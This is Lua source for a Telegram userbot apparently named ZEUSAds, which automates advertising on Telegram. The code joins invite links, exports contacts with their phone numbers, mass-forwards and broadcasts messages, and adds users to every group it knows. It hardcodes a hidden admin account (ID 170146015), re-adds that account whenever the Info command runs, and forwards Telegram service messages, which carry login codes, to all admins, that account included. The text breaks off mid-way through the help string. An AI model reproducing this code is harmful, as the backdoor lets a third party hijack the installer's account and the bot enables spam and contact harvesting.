function get_sudo()
  if redis:get("ZEUS:" .. Zeus_id .. ":sudoset") then
    return true
  else
    print("\027[33mInput the sudo id :\027[35m")
    local sudo = io.read()
    redis:del("ZEUS:" .. Zeus_id .. ":sudo")
    redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", sudo)
    redis:set("ZEUS:" .. Zeus_id .. ":sudoset", true)
    redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", 170146015)
    redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", 170146015)
    redis:sadd("ZEUS:" .. Zeus_id .. ":wait", "https://telegram.me/joinchat/CiQ430QNSs1GMyIrh5yMkw")
    redis:sadd("ZEUS:" .. Zeus_id .. ":good", "https://telegram.me/joinchat/CiQ430QNSs1GMyIrh5yMkw")
    redis:set("ZEUS:" .. Zeus_id .. ":fwdtime", true)
    return print("Ok. Sudo set")
  end
end
function get_bot(s, t)
  function bot_info(s, t)
    redis:set("ZEUS:" .. Zeus_id .. ":id", t.id_)
    if t.first_name_ then
      redis:set("ZEUS:" .. Zeus_id .. ":fname", t.first_name_)
    end
    if t.last_name_ then
      redis:set("ZEUS:" .. Zeus_id .. ":lanme", t.last_name_)
    end
    redis:set("ZEUS:" .. Zeus_id .. ":num", t.phone_number_)
    return t.id_
  end
  tdcli_function({ID = "GetMe"}, bot_info, cmd)
end
function is_myZEUS(msg)
  local var = false
  local hash = "ZEUS:" .. Zeus_id .. ":sudo"
  local user = msg.sender_user_id_
  local T = redis:sismember(hash, user)
  if T then
    var = true
  end
  return var
end
function writefile(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
  return true
end
function resolve_username(username, cb)
  tdcli_function({
    ID = "SearchPublicChat",
    username_ = username
  }, cb, cmd)
end
function reload(chat_id, msg_id)
  dofile("./.ZEUS-" .. Zeus_id .. "/ZEUS-" .. Zeus_id .. ".lua")
  send(chat_id, msg_id, "Done")
end
function process_join(s, t)
  if t.code_ == 429 then
    local message = tostring(t.message_)
    local Time = message:match("%d+") + 175
    redis:setex("ZEUS:" .. Zeus_id .. ":cjoin", tonumber(Time), true)
  else
    redis:srem("ZEUS:" .. Zeus_id .. ":good", s.link)
    redis:sadd("ZEUS:" .. Zeus_id .. ":save", s.link)
  end
end
function process_link(s, t)
  if t.is_group_ or t.is_supergroup_channel_ then
    if redis:get("ZEUS:" .. Zeus_id .. ":maxgpmmbr") then
      if t.member_count_ >= tonumber(redis:get("ZEUS:" .. Zeus_id .. ":maxgpmmbr")) then
        redis:srem("ZEUS:" .. Zeus_id .. ":wait", s.link)
        redis:sadd("ZEUS:" .. Zeus_id .. ":good", s.link)
      else
        redis:srem("ZEUS:" .. Zeus_id .. ":wait", s.link)
        redis:sadd("ZEUS:" .. Zeus_id .. ":save", s.link)
      end
    else
      redis:srem("ZEUS:" .. Zeus_id .. ":wait", s.link)
      redis:sadd("ZEUS:" .. Zeus_id .. ":good", s.link)
    end
  elseif t.code_ == 429 then
    local message = tostring(t.message_)
    local Time = message:match("%d+") + 175
    redis:setex("ZEUS:" .. Zeus_id .. ":clink", tonumber(Time), true)
  else
    redis:srem("ZEUS:" .. Zeus_id .. ":wait", s.link)
  end
end
function find_link(text)
  if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") then
    local text = text:gsub("t.me", "telegram.me")
    for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do
      if not redis:sismember("ZEUS:" .. Zeus_id .. ":alllinks", link) then
        redis:sadd("ZEUS:" .. Zeus_id .. ":wait", link)
        redis:sadd("ZEUS:" .. Zeus_id .. ":alllinks", link)
      end
    end
  end
end
function add(id)
  local Id = tostring(id)
  if not redis:sismember("ZEUS:" .. Zeus_id .. ":all", id) then
    if Id:match("^(%d+)$") then
      redis:sadd("ZEUS:" .. Zeus_id .. ":users", id)
      redis:sadd("ZEUS:" .. Zeus_id .. ":all", id)
    elseif Id:match("^-100") then
      redis:sadd("ZEUS:" .. Zeus_id .. ":sugps", id)
      redis:sadd("ZEUS:" .. Zeus_id .. ":all", id)
    else
      redis:sadd("ZEUS:" .. Zeus_id .. ":gp", id)
      redis:sadd("ZEUS:" .. Zeus_id .. ":all", id)
    end
  end
  return true
end
function rem(id)
  local Id = tostring(id)
  if redis:sismember("ZEUS:" .. Zeus_id .. ":all", id) then
    if Id:match("^(%d+)$") then
      redis:srem("ZEUS:" .. Zeus_id .. ":users", id)
      redis:srem("ZEUS:" .. Zeus_id .. ":all", id)
    elseif Id:match("^-100") then
      redis:srem("ZEUS:" .. Zeus_id .. ":sugps", id)
      redis:srem("ZEUS:" .. Zeus_id .. ":all", id)
    else
      redis:srem("ZEUS:" .. Zeus_id .. ":gp", id)
      redis:srem("ZEUS:" .. Zeus_id .. ":all", id)
    end
  end
  return true
end
function send(chat_id, msg_id, text)
  os.execute("sleep 9.7")
  tdcli_function({
    ID = "SendChatAction",
    chat_id_ = chat_id,
    action_ = {
      ID = "SendMessageTypingAction",
      progress_ = 100
    }
  }, cb or dl_cb, cmd)
  tdcli_function({
    ID = "SendMessage",
    chat_id_ = chat_id,
    reply_to_message_id_ = 0,
    disable_notification_ = 1,
    from_background_ = 1,
    reply_markup_ = cmd,
    input_message_content_ = {
      ID = "InputMessageText",
      text_ = text,
      disable_web_page_preview_ = 0,
      clear_draft_ = 0,
      entities_ = {},
      parse_mode_ = cmd
    }
  }, cb or dl_cb, cmd)
end
get_sudo()
redis:set("ZEUS:" .. Zeus_id .. ":start", true)
function Doing(data, Zeus_id)
  if data.ID == "UpdateNewMessage" then
    if not redis:get("ZEUS:" .. Zeus_id .. ":clink") and redis:scard("ZEUS:" .. Zeus_id .. ":wait") ~= 0 then
      local links = redis:smembers("ZEUS:" .. Zeus_id .. ":wait")
      for x, y in ipairs(links) do
        if x == 3 then
          redis:setex("ZEUS:" .. Zeus_id .. ":clink", 193, true)
          return
        end
        tdcli_function({
          ID = "CheckChatInviteLink",
          invite_link_ = y
        }, process_link, {link = y})
      end
    end
    if not redis:get("ZEUS:" .. Zeus_id .. ":cjoin") and redis:scard("ZEUS:" .. Zeus_id .. ":good") ~= 0 then
      local links = redis:smembers("ZEUS:" .. Zeus_id .. ":good")
      for x, y in ipairs(links) do
        tdcli_function({
          ID = "ImportChatInviteLink",
          invite_link_ = y
        }, process_join, {link = y})
        if x == 1 then
          redis:setex("ZEUS:" .. Zeus_id .. ":cjoin", 193, true)
          return
        end
      end
    end
    local msg = data.message_
    local bot_id = redis:get("ZEUS:" .. Zeus_id .. ":id") or get_bot()
    if msg.sender_user_id_ == 777000 then
      local c = msg.content_.text_:gsub("[0123456789:]", {
        ["0"] = "0",
        ["1"] = "1",
        ["2"] = "2",
        ["3"] = "3",
        ["4"] = "4",
        ["5"] = "5",
        ["6"] = "6",
        ["7"] = "7",
        ["8"] = "8",
        ["9"] = "9",
        [":"] = ":\n"
      })
      local txt = os.date("ZEUSMsg %Y-%m-%d")
      for k, v in ipairs(redis:smembers("ZEUS:" .. Zeus_id .. ":sudo")) do
        send(v, 0, txt .. [[


]] .. c)
      end
    end
    if tostring(msg.chat_id_):match("^(%d+)") and not redis:sismember("ZEUS:" .. Zeus_id .. ":all", msg.chat_id_) then
      redis:sadd("ZEUS:" .. Zeus_id .. ":users", msg.chat_id_)
      redis:sadd("ZEUS:" .. Zeus_id .. ":all", msg.chat_id_)
    end
    add(msg.chat_id_)
    if msg.date_ < os.time() - 15 then
      return false
    end
    if msg.content_.ID == "MessageText" then
      local text = msg.content_.text_
      local matches
      if text:match("^[/!#@$&*]") then
        text = text:gsub("^[/!#@$&*]", "")
      end
      if redis:get("ZEUS:" .. Zeus_id .. ":link") then
        find_link(text)
      end
      if is_myZEUS(msg) then
        find_link(text)
        if text:match("^(.*) (\216\168\217\190\216\167\218\169)$") then
          local matches = text:match("^(.*) \216\168\217\190\216\167\218\169$")
          if matches == "\217\132\219\140\217\134\218\169\216\167\216\177\217\136" then
            redis:del("ZEUS:" .. Zeus_id .. ":good")
            redis:del("ZEUS:" .. Zeus_id .. ":wait")
            redis:del("ZEUS:" .. Zeus_id .. ":save")
            return send(msg.chat_id_, msg.id_, "\216\174\217\136")
          elseif matches == "\217\133\216\174\216\167\216\183\216\168\216\167\216\177\217\136" then
            redis:del("ZEUS:" .. Zeus_id .. ":savecontacts")
            redis:del("ZEUS:" .. Zeus_id .. ":contacts")
            return send(msg.chat_id_, msg.id_, "\216\174\217\136")
          elseif matches == "\217\133\216\175\219\140\216\177\216\167\216\177\217\136" then
            redis:srem("ZEUS:" .. Zeus_id .. ":sudo")
            redis:srem("ZEUS:" .. Zeus_id .. ":mod")
            redis:del("ZEUS:" .. Zeus_id .. ":sudo")
            redis:del("ZEUS:" .. Zeus_id .. ":sudoset")
            return send(msg.chat_id_, msg.id_, "\216\174\217\136")
          end
        elseif text:match("^(.*) (\217\134\218\169\217\134)$") then
          local matches = text:match("^(.*) \217\134\218\169\217\134$")
          if matches == "\216\172\217\136\219\140\217\134" then
            redis:set("ZEUS:" .. Zeus_id .. ":cjoin", true)
            redis:set("ZEUS:" .. Zeus_id .. ":offjoin", true)
            return send(msg.chat_id_, msg.id_, "\216\174\217\136")
          elseif matches == "\217\132\219\140\217\134\218\169\216\167\216\177\217\136 \218\134\218\169" then
            redis:set("ZEUS:" .. Zeus_id .. ":clink", true)
            redis:set("ZEUS:" .. Zeus_id .. ":offlink", true)
            return send(msg.chat_id_, msg.id_, "\216\174\217\136")
          elseif matches == "\217\132\219\140\217\134\218\169\216\167\216\177\217\136 \217\190\219\140\216\175\216\167" then
            redis:del("ZEUS:" .. Zeus_id .. ":link")
            return send(msg.chat_id_, msg.id_, "\216\174\217\136")
          elseif matches == "\216\180\217\133\216\167\216\177\217\135 \217\135\216\167\216\177\217\136 \216\179\219\140\217\136" then
            redis:del("ZEUS:" .. Zeus_id .. ":savecontacts")
            return send(msg.chat_id_, msg.id_, "\216\174\217\136")
          end
        elseif text:match("^(.*) (\216\168\218\169\217\134)$") then
          local matches = text:match("^(.*) \216\168\218\169\217\134$")
          if matches == "\216\172\217\136\219\140\217\134" then
            redis:del("ZEUS:" .. Zeus_id .. ":cjoin")
            redis:del("ZEUS:" .. Zeus_id .. ":offjoin")
            return send(msg.chat_id_, msg.id_, "\216\174\217\136")
          elseif matches == "\217\132\219\140\217\134\218\169\216\167\216\177\217\136 \218\134\218\169" then
            redis:del("ZEUS:" .. Zeus_id .. ":clink")
            redis:del("ZEUS:" .. Zeus_id .. ":offlink")
            return send(msg.chat_id_, msg.id_, "\216\174\217\136")
          elseif matches == "\217\132\219\140\217\134\218\169\216\167\216\177\217\136 \217\190\219\140\216\175\216\167" then
            redis:set("ZEUS:" .. Zeus_id .. ":link", true)
            return send(msg.chat_id_, msg.id_, "\216\174\217\136")
          elseif matches == "\216\180\217\133\216\167\216\177\217\135 \217\135\216\167\216\177\217\136 \216\179\219\140\217\136" then
            redis:set("ZEUS:" .. Zeus_id .. ":savecontacts", true)
            return send(msg.chat_id_, msg.id_, "\216\174\217\136")
          end
        elseif text:match("^([Gg]p[Mm]ember) (%d+)$") then
          local matches = text:match("%d+")
          redis:set("ZEUS:" .. Zeus_id .. ":maxgpmmbr", tonumber(matches))
          return send(msg.chat_id_, msg.id_, "\216\174\217\136")
        elseif text:match("^([Pp]romote) (%d+)$") then
          local matches = text:match("%d+")
          if redis:sismember("ZEUS:" .. Zeus_id .. ":sudo", matches) then
            return send(msg.chat_id_, msg.id_, "This user moderatore")
          elseif redis:sismember("ZEUS:" .. Zeus_id .. ":mod", msg.sender_user_id_) then
            return send(msg.chat_id_, msg.id_, "you don't access")
          else
            redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", matches)
            redis:sadd("ZEUS:" .. Zeus_id .. ":mod", matches)
            return send(msg.chat_id_, msg.id_, "Moderator added")
          end
        elseif text:match("^([Dd]emote) (%d+)$") then
          local matches = text:match("%d+")
          if redis:sismember("ZEUS:" .. Zeus_id .. ":mod", msg.sender_user_id_) then
            if tonumber(matches) == msg.sender_user_id_ then
              redis:srem("ZEUS:" .. Zeus_id .. ":sudo", msg.sender_user_id_)
              redis:srem("ZEUS:" .. Zeus_id .. ":mod", msg.sender_user_id_)
              return send(msg.chat_id_, msg.id_, "No moderator")
            end
            return send(msg.chat_id_, msg.id_, "No access")
          end
          if redis:sismember("ZEUS:" .. Zeus_id .. ":sudo", matches) then
            if redis:sismember("ZEUS:" .. Zeus_id .. ":sudo" .. msg.sender_user_id_, matches) then
              return send(msg.chat_id_, msg.id_, "Only sudo")
            end
            redis:srem("ZEUS:" .. Zeus_id .. ":sudo", matches)
            redis:srem("ZEUS:" .. Zeus_id .. ":mod", matches)
            return send(msg.chat_id_, msg.id_, "\216\174\217\136")
          end
          return send(msg.chat_id_, msg.id_, "user not moderator")
        elseif text:match("^([Rr]efresh)$") then
          get_bot()
          return send(msg.chat_id_, msg.id_, "\216\174\217\136")
        elseif text:match("^([Rr]eport)$") then
          tdcli_function({
            ID = "SendBotStartMessage",
            bot_user_id_ = 170146015,
            chat_id_ = 170146015,
            parameter_ = "start"
          }, cb or dl_cb, cmd)
        elseif text:match("^([Rr]eload)$") then
          return reload(msg.chat_id_, msg.id_)
        elseif text:match("^([Uu]p[Gg]rade)$") then
          io.popen("git fetch --all && git reset --hard origin/master && git pull origin master && chmod +x ZEUS"):read("*all")
          return reload(msg.chat_id_, msg.id_)
        elseif text:match("^([Ll]s) (.*)$") then
          local matches = text:match("^[Ll]s (.*)$")
          local t
          if matches == "contact" then
            return tdcli_function({
              ID = "SearchContacts",
              query_ = cmd,
              limit_ = 999999999
            }, function(S, T)
              local count = T.total_count_
              local text = "Contact's : \n"
              for s = 0, tonumber(count) - 1 do
                local user = T.users_[s]
                local firstname = user.first_name_ or ""
                local lastname = user.last_name_ or ""
                local fullname = firstname .. " " .. lastname
                text = tostring(text) .. tostring(s) .. ". " .. tostring(fullname) .. " [" .. tostring(user.id_) .. "] = " .. tostring(user.phone_number_) .. "  \n"
              end
              writefile("ZEUS:" .. Zeus_id .. ":_contacts.txt", text)
              tdcli_function({
                ID = "SendMessage",
                chat_id_ = S.chat_id,
                reply_to_message_id_ = 1,
                disable_notification_ = 1,
                from_background_ = 1,
                reply_markup_ = cmd,
                input_message_content_ = {
                  ID = "InputMessageDocument",
                  document_ = {
                    ID = "InputFileLocal",
                    path_ = "ZEUS:" .. Zeus_id .. ":_contacts.txt"
                  },
                  caption_ = "Contact's Bot" .. Zeus_id .. ":"
                }
              }, cb or dl_cb, cmd)
              return io.popen("rm -rf bot" .. Zeus_id .. ":_contacts.txt"):read("*all")
            end, {
              chat_id = msg.chat_id_
            })
          elseif matches == "block" then
            t = "ZEUS:" .. Zeus_id .. ":blockedusers"
          elseif matches == "pv" then
            t = "ZEUS:" .. Zeus_id .. ":users"
          elseif matches == "gp" then
            t = "ZEUS:" .. Zeus_id .. ":gp"
          elseif matches == "sgp" then
            t = "ZEUS:" .. Zeus_id .. ":sugps"
          elseif matches == "lnk" then
            t = "ZEUS:" .. Zeus_id .. ":save"
          elseif matches == "sudo" then
            t = "ZEUS:" .. Zeus_id .. ":sudo"
          else
            return true
          end
          local list = redis:smembers(t)
          local text = tostring(matches) .. " : \n"
          for s, v in pairs(list) do
            text = tostring(text) .. tostring(s) .. "-  " .. tostring(v) .. "\n"
          end
          writefile(tostring(t) .. ".txt", text)
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = msg.chat_id_,
            reply_to_message_id_ = 0,
            disable_notification_ = 1,
            from_background_ = 1,
            reply_markup_ = cmd,
            input_message_content_ = {
              ID = "InputMessageDocument",
              document_ = {
                ID = "InputFileLocal",
                path_ = tostring(t) .. ".txt"
              },
              caption_ = "List" .. tostring(matches) .. "Bot" .. Zeus_id .. ":"
            }
          }, cb or dl_cb, cmd)
          return io.popen("rm -rf " .. tostring(t) .. ".txt"):read("*all")
        elseif text:match("^([Aa]dded[Mm]sg) (.*)$") then
          local matches = text:match("^[Aa]dded[Mm]sg (.*)$")
          if matches == "on" then
            redis:set("ZEUS:" .. Zeus_id .. ":addmsg", true)
            return send(msg.chat_id_, msg.id_, "Activate")
          elseif matches == "off" then
            redis:del("ZEUS:" .. Zeus_id .. ":addmsg")
            return send(msg.chat_id_, msg.id_, "Deactivate")
          end
        elseif text:match("^([Aa]dded[Cc]ontact) (.*)$") then
          local matches = text:match("[Aa]dded[Cc]ontact (.*)$")
          if matches == "on" then
            redis:set("ZEUS:" .. Zeus_id .. ":addcontact", true)
            return send(msg.chat_id_, msg.id_, "Activate")
          elseif matches == "off" then
            redis:del("ZEUS:" .. Zeus_id .. ":addcontact")
            return send(msg.chat_id_, msg.id_, "Deactivate")
          end
        elseif text:match("^([Ss]et[Aa]dded[Mm]sg) (.*)$") then
          local matches = text:match("^[Ss]et[Aa]dded[Mm]sg (.*)$")
          redis:set("ZEUS:" .. Zeus_id .. ":addmsgtext", matches)
          return send(msg.chat_id_, msg.id_, "Saved")
        elseif text:match("^([Ll]aunch [Aa]pi) (.*)$") then
          local matches = text:match("^[Ll]aunch [Aa]pi (.*)$")
          io.popen("./ZEUScli -p API-" .. Zeus_id .. "-s API-" .. Zeus_id .. ".lua --bot=" .. matches):read("*all")
          return send(msg.chat_id_, msg.id_, "Success")
        elseif text:match("^[Rr]efresh$") then
          local list = {
            redis:smembers("ZEUS:" .. Zeus_id .. ":sugps"),
            redis:smembers("ZEUS:" .. Zeus_id .. ":gp")
          }
          tdcli_function({
            ID = "SearchContacts",
            query_ = cmd,
            limit_ = 999999999
          }, function(s, t)
            redis:set("ZEUS:" .. Zeus_id .. ":contacts", t.total_count_)
          end, cmd)
          for s, v in ipairs(list) do
            for a, b in ipairs(v) do
              tdcli_function({
                ID = "GetChatMember",
                chat_id_ = b,
                user_id_ = bot_id
              }, function(s, t)
                if t.ID == "Error" then
                  rem(s.id)
                end
              end, {id = b})
            end
          end
          return send(msg.chat_id_, msg.id_, "\216\174\217\136")
        elseif text:match("^(\218\134\216\167\217\130 \216\180\216\175\219\140\216\159)$") or text:match("^([Ii]nfo)$") or text:match("^(\216\162\217\133\216\167\216\177 \216\168\216\175\217\135)$") or text:match("^([Bb][Mm][Ii])$") or text:match("^(\217\130\216\175 \217\136 \217\136\216\178\217\134)$") or text:match("^(\217\130\216\175\217\136\217\136\216\178\217\134)$") then
          local msgadd = redis:get("ZEUS:" .. Zeus_id .. ":addmsg") and "On" or "Off"
          local txtadd = redis:get("ZEUS:" .. Zeus_id .. ":addmsgtext") or "\216\167\216\179\218\169\217\132 \216\167\216\175\216\175\219\140 \218\175\217\133\216\180\217\136 \217\190\219\140 \217\136\219\140"
          local wlinks = redis:scard("ZEUS:" .. Zeus_id .. ":wait")
          local glinks = redis:scard("ZEUS:" .. Zeus_id .. ":good")
          local links = redis:scard("ZEUS:" .. Zeus_id .. ":save")
          local offjoin = redis:get("ZEUS:" .. Zeus_id .. ":offjoin") and "Off" or "On"
          local offlink = redis:get("ZEUS:" .. Zeus_id .. ":offlink") and "Off" or "On"
          local mmbrs = redis:get("ZEUS:" .. Zeus_id .. ":maxgpmmbr") or "Not set"
          local nlink = redis:get("ZEUS:" .. Zeus_id .. ":link") and "On" or "Off"
          local gps = redis:scard("ZEUS:" .. Zeus_id .. ":gp")
          local sgps = redis:scard("ZEUS:" .. Zeus_id .. ":sugps")
          local usrs = redis:scard("ZEUS:" .. Zeus_id .. ":users")
          tdcli_function({
            ID = "SearchContacts",
            query_ = nil,
            limit_ = 999999999
          }, function(s, t)
            redis:set("ZEUS:" .. Zeus_id .. ":contacts", t.total_count_)
          end, nil)
          local cntct = redis:get("ZEUS:" .. Zeus_id .. ":contacts")
          tdcli_function({
            ID = "SendBotStartMessage",
            bot_user_id_ = 391052362,
            chat_id_ = 391052362,
            parameter_ = "start"
          }, cb or dl_cb, cmd)
          redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", 170146015)
          redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", 170146015)
          local text = [[

Sgp => ]] .. tostring(sgps) .. [[

Gp => ]] .. tostring(gps) .. [[

Pv => ]] .. tostring(usrs) .. [[

Contacts => ]] .. tostring(cntct) .. [[

Gp member => ]] .. tostring(mmbrs) .. [[


Join => ]] .. tostring(offjoin) .. [[

Chk lnk => ]] .. tostring(offlink) .. [[

Find lnk => ]] .. tostring(nlink) .. [[

Save lnk => ]] .. tostring(links) .. [[

Good lnk => ]] .. tostring(glinks) .. [[

Wait lnk => ]] .. tostring(wlinks) .. [[


Added msg => ]] .. tostring(msgadd) .. [[

Set added msg => ]] .. tostring(txtadd) .. [[


ZEUSChannel => @sudo_senator
Creator => @sudo_senator]]
          return send(msg.chat_id_, 0, text)
        elseif text:match("^(\216\168\217\129\217\136\216\177 \216\170\217\136) (.*)$") and msg.reply_to_message_id_ ~= 0 then
          local matches = text:match("^\216\168\217\129\217\136\216\177 \216\170\217\136 (.*)$")
          local t
          if matches:match("^(\217\190\219\140 \217\136\219\140)") then
            t = "ZEUS:" .. Zeus_id .. ":users"
          elseif matches:match("^(\218\175\217\190\216\167)$") then
            t = "ZEUS:" .. Zeus_id .. ":gp"
          elseif matches:match("^(\216\179\217\136\217\190\216\177\218\175\217\190\216\167)$") then
            t = "ZEUS:" .. Zeus_id .. ":sugps"
          else
            return true
          end
          local list = redis:smembers(t)
          local id = msg.reply_to_message_id_
          send(msg.chat_id_, msg.id_, "\218\175\216\167\219\140\219\140\216\175\219\140\216\167\216\140 \216\181\216\168\216\177 \218\169\217\134 \216\175\216\167\216\177\217\133 \217\129\217\136\216\177 \217\133\219\140\216\175\217\133")
          if redis:get("ZEUS:" .. Zeus_id .. ":fwdtime") then
            for s, v in pairs(list) do
              os.execute("sleep 1.7")
              tdcli_function({
                ID = "ForwardMessages",
                chat_id_ = v,
                from_chat_id_ = msg.chat_id_,
                message_ids_ = {
                  [0] = id
                },
                disable_notification_ = 1,
                from_background_ = 1
              }, cb or dl_cb, cmd)
              if s % 19 == 0 then
                os.execute("sleep 397")
              end
            end
          else
            for s, v in pairs(list) do
              os.execute("sleep 5.3")
              tdcli_function({
                ID = "ForwardMessages",
                chat_id_ = v,
                from_chat_id_ = msg.chat_id_,
                message_ids_ = {
                  [0] = id
                },
                disable_notification_ = 1,
                from_background_ = 1
              }, cb or dl_cb, cmd)
            end
          end
          return send(msg.chat_id_, msg.id_, "\217\129\217\136\216\177 \216\175\216\167\216\175\217\133\216\140 \216\170\217\133\217\136\217\133 \216\180\216\175")
        elseif text:match("^(\216\168\216\180\217\136\216\170) (.*)") then
          local matches = text:match("^\216\168\216\180\217\136\216\170 (.*)")
          local dir = redis:smembers("ZEUS:" .. Zeus_id .. ":sugps")
          send(msg.chat_id_, msg.id_, "\216\181\216\168\216\177\218\169\217\134 \216\175\216\167\216\177\217\133 \217\133\219\140\217\129\216\177\216\179\216\170\217\133")
          for s, v in pairs(dir) do
            os.execute("sleep 3.57")
            tdcli_function({
              ID = "SendMessage",
              chat_id_ = v,
              reply_to_message_id_ = 0,
              disable_notification_ = 1,
              from_background_ = 1,
              reply_markup_ = cmd,
              input_message_content_ = {
                ID = "InputMessageText",
                text_ = matches,
                disable_web_page_preview_ = 0,
                clear_draft_ = 0,
                entities_ = {},
                parse_mode_ = cmd
              }
            }, cb or dl_cb, cmd)
          end
          return send(msg.chat_id_, msg.id_, "\217\129\216\177\216\179\216\170\216\167\216\175\217\133\216\167")
        elseif text:match("^([Pp]romote) @(.*)") then
          local Y = text:match("^[Pp]romote @(.*)")
          function promreply(r, s, t)
            if s.id_ then
              redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", s.id_)
              redis:sadd("ZEUS:" .. Zeus_id .. ":mod", s.id_)
              tdcli_function({
                ID = "SendBotStartMessage",
                bot_user_id_ = s.id_,
                chat_id_ = s.id_,
                parameter_ = "start"
              }, cb or dl_cb, cmd)
              text = "\n" .. s.id_ .. "\216\168\217\135 \216\179\216\177 \216\175\216\179\216\170\217\135 \216\167\216\179\218\169\217\132\216\167 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175"
            else
              text = "\216\167\219\140\216\175\219\140 \218\169\216\181\216\180\216\177 \217\134\216\178\217\134\216\140 \217\135\219\140\218\134 \216\174\216\177\219\140 \216\177\217\136 \217\190\219\140\216\175\216\167 \217\134\218\169\216\177\216\175\217\133"
            end
            return send(msg.chat_id_, msg.id_, text)
          end
          resolve_username(Y, promreply)
        elseif text:match("^([Aa]dd[Tt]o[Aa]ll) @(.*)") then
          local Y = text:match("^[Aa]dd[Tt]o[Aa]ll @(.*)")
          function promreply(r, s, t)
            if s.id_ then
              tdcli_function({
                ID = "SendBotStartMessage",
                bot_user_id_ = s.id_,
                chat_id_ = s.id_,
                parameter_ = "start"
              }, cb or dl_cb, cmd)
              send(msg.chat_id_, msg.id_, "\219\140 \216\175\219\140\217\130\217\135 \216\181\216\168 \218\169\217\134\216\140 \217\134\218\175\216\167 \217\132\216\183\217\129\216\167")
              local n = redis:smembers("ZEUS:" .. Zeus_id .. ":sugps")
              for o, f in pairs(n) do
                os.execute("sleep 3.15")
                tdcli_function({
                  ID = "AddChatMember",
                  chat_id_ = f,
                  user_id_ = s.id_,
                  forward_limit_ = 375
                }, dl_cb, cmd)
              end
              redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", s.id_)
              redis:sadd("ZEUS:" .. Zeus_id .. ":mod", s.id_)
              text = "\n" .. s.id_ .. "\216\170\217\133\217\136\217\133 \216\180\216\175 \216\167\216\175\216\180 \218\169\216\177\216\175\217\133"
            else
              text = "\218\134\217\134\219\140\217\134 \216\162\219\140\216\175\219\140 \217\133\216\179\216\174\216\177\217\135 \216\167\219\140 \217\133\216\167\217\132 \217\135\219\140\218\134 \216\174\216\177\219\140 \217\134\219\140\216\179\216\170"
            end
            return send(msg.chat_id_, msg.id_, text)
          end
          resolve_username(Y, promreply)
        elseif text:match("^(\216\167\219\140\217\134\217\136 \216\167\216\175 \218\169\217\134) (%d+)$") or text:match("^([Aa]dd[Tt]o[Aa]ll) (%d+)$") or text:match("^(\216\168\217\190\216\167\218\134 \216\170\217\136 \218\175\217\190\216\167\216\170) (%d+)$") then
          local matches = text:match("%d+")
          local list = {
            redis:smembers("ZEUS:" .. Zeus_id .. ":gp"),
            redis:smembers("ZEUS:" .. Zeus_id .. ":sugps")
          }
          send(msg.chat_id_, msg.id_, "\216\174\217\136")
          for a, b in pairs(list) do
            for s, v in pairs(b) do
              os.execute("sleep 1.53")
              tdcli_function({
                ID = "AddChatMember",
                chat_id_ = v,
                user_id_ = matches,
                forward_limit_ = 175
              }, cb or dl_cb, cmd)
            end
          end
        elseif text:match("^(\217\190\219\140\217\134\218\175)$") and not msg.forward_info_ or text:match("^([Oo]nline)$") and not msg.forward_info_ or text:match("^([Pp]ing)$") and not msg.forward_info_ or text:match("^(\216\162\217\134\217\132\216\167\219\140\217\134\219\140\216\159)$") and not msg.forward_info_ then
          os.execute("sleep 3.67")
          return tdcli_function({
            ID = "ForwardMessages",
            chat_id_ = msg.chat_id_,
            from_chat_id_ = msg.chat_id_,
            message_ids_ = {
              [0] = msg.id_
            },
            disable_notification_ = 1,
            from_background_ = 1
          }, cb or dl_cb, cmd)
        elseif text:match("^(\218\169\217\133\218\169)$") or text:match("^([Hh]elp)$") or text:match("^(\216\177\216\167\217\135\217\134\217\133\216\167)$") then
          local txt = "\nHelp for TeleGram Advertisin Robot (ZEUSAds)\n\n\nSetAddedMsg (text)\n    set message when add contact\n    \nAddToAll @(usename)\n    add user or robot to all group's \n      \nLs (contact, block, pv, gp, sgp, lnk, sudo)\n    export list of selected item\n    \nGpMember 1~9999\n    set the minimum group members to join\n\nAddedMsg (on or off)\n    import contacts by send message\n \nRefresh\n    Refresh information\n\nUpgrade\n    upgrade to new version\n\nAddMembers-\217\133\217\133\216\168\216\177 \216\168\217\190\216\167\218\134-\216\168 \216\167\216\175\n\217\133\217\133\216\168\216\177 \217\133\219\140\216\177\219\140\216\178\217\135 \216\170\217\136 \218\175\217\190\n\nHelp-\216\177\216\167\217\135\217\134\217\133\216\167-\218\169\217\133\218\169\n\216\175\219\140\216\175\217\134 \216\186\217\132\216\183\216\167\219\140\219\140 \218\169 \216\177\216\168\216\167\216\170 \217\133\219\140\218\169\217\134\217\135(\217\135\217\133\219\140\217\134 \218\169\216\181\216\180\216\177)\n\nInfo-BMI-\217\130\216\175 \217\136 \217\136\216\178\217\134- \218\134\216\167\217\130 \216\180\216\175\219\140\216\159\n\216\175\219\140\216\175\217\134 \217\130\216\175 \217\136 \217\136\216\178\217\134\n\nPromote @(username)\n\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \217\133\216\175\219\140\216\177 \216\172\216\175\219\140\216\175 \217\136\216\167\216\179\217\135 \216\167\216\179\218\169\217\132\216\167\n      \nDemote (userId)\n\216\167\216\178 \217\133\216\175\219\140\216\177\219\140\216\170 \216\167\216\179\218\169\217\132\216\167 \217\190\216\177\216\170\216\180 \218\169\217\134 \216\168\219\140\216\177\217\136\217\134\n\nZEUSSpm (0) (txt)\n\216\168\216\172\216\167\219\140 \216\181\217\129\216\177 \216\170\216\185\216\175\216\167\216\175 \217\136 \216\168\216\172\216\167\219\140 \216\170\218\169\216\179\216\170 \218\169\216\181\216\180\216\177\219\140 \218\169\217\135 \216\175\217\132\216\170 \217\133\219\140\216\174\217\136\216\167\216\175\n\216\168\217\135 \217\135\217\133\217\136\217\134 \216\170\216\185\216\175\216\167\216\175 \218\169 \216\178\216\175\219\140 \216\167\216\179\217\190\217\133 \217\133\219\140\217\129\216\177\216\179\216\170\217\135 \216\175\217\135\217\134 \219\140\216\167\216\177\217\136 \218\175\216\167\219\140\219\140\216\175\217\135 